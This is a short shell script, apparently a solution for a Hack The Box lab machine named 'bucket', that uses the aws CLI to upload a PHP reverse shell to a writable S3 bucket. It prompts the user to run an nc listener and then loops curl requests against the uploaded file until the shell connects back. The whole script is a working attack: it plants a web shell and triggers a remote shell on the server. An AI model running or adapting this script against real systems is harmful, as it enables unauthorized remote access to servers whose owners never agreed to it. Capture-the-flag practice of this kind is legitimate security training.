#!/bin/sh

aws --endpoint-url http://s3.bucket.htb/ s3 cp revshell.php s3://adserver/

echo ""
echo "[-] Executing reverse shell...Please run nc listener"
echo "[-] Kill me with Ctrl+C on successful connection"

while [ true ]
do
	curl http://bucket.htb/revshell.php &> /dev/null
done
